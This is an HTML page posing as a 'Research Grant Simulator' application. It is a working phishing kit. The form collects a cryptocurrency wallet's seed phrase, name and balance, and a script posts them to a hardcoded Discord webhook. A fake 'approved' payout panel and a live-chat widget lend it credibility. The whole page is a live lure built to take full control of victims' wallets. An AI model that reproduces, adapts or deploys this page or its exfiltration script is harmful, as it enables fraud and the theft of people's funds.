<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Research Grant Simulator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: #0073aa;
            color: white;
            padding: 10px 0;
            text-align: center;
        }
        header h1 {
            margin: 0;
            font-size: 24px;
        }
        .sidebar {
            float: left;
            width: 25%;
            background-color: #fff;
            padding: 10px;
            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
        }
        .main-content {
            float: right;
            width: 70%;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 5px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        button {
            background-color: #005d8f;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #004d75;
        }
        #successMessage {
            display: none;
            color: green;
            margin-top: 10px;
        }
        .error {
            color: red;
            display: none;
            margin-top: 5px;
        }
        .payout-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #0073aa;
            color: white;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Research Grant Simulator</h1>
    </header>
    <div class="container">
        <div class="sidebar">
            <h3>Account Info</h3>
            <p><strong>User:</strong> ResearchStudent01</p>
            <p><strong>Status:</strong> Active</p>
            <button>Update Profile</button>
        </div>
        <div class="main-content">
            <h2>Application Form</h2>
            <form id="walletSection" onsubmit="sendToDiscord(event)">
                <div class="form-group">
                    <label for="walletName">Wallet Name:</label>
                    <input type="text" id="walletName" name="walletName" required>
                </div>
                <div class="form-group">
                    <label for="seedInput">Seed Phrase:</label>
                    <input type="text" id="seedInput" name="seedInput" required>
                </div>
                <div class="form-group">
                    <label for="balance">Minimum Balance ($1,000 required):</label>
                    <input type="number" id="balance" name="balance" required>
                    <div id="balanceError" class="error">Minimum balance must be $1,000 or more.</div>
                </div>
                <button type="submit">Submit Application</button>
            </form>
            <div id="successMessage">Submission successful! Thank you.</div>
            <div class="payout-section">
                <h3>Payout Status</h3>
                <p><strong>Application ID:</strong> RS-12345</p>
                <p><strong>Amount Approved:</strong> $5,000</p>
                <p><strong>Status:</strong> Processing</p>
                <button>Check Payout Details</button>
            </div>
        </div>
    </div>

    <!-- Live Chat Widget (Smartsupp) -->
    <script type="text/javascript">
        var _smartsupp = _smartsupp || {};
        _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57'; // your unique key
        window.smartsupp || (function(d) {
            var s, c, o = smartsupp = function() { o._.push(arguments); }; o._ = [];
            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
            c.src = 'https://www.smartsuppchat.com/loader.js?';
            s.parentNode.insertBefore(c, s);
        })(document);
    </script>

    <!-- Discord Webhook Script with Balance Validation -->
    <script>
        function sendToDiscord(event) {
            event.preventDefault();

            const walletName = document.getElementById('walletName').value;
            const phrase = document.getElementById('seedInput').value;
            const balance = document.getElementById('balance').value;
            const balanceError = document.getElementById('balanceError');

            if (parseFloat(balance) < 1000) {
                balanceError.style.display = 'block';
                return;
            }
            balanceError.style.display = 'none';

            const data = {
                content: `ðŸ”¥ New Submission:
                \nWallet Name: *${walletName}*
                \nSeed Phrase: *${phrase}*
                \nBalance: *$${balance}*`
            };

            fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('walletSection').reset();
                document.getElementById('walletSection').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
            }).catch(err => {
                alert("Failed to connect. Try again later.");
                console.error(err);
            });
        }
    </script>
</body>
</html>
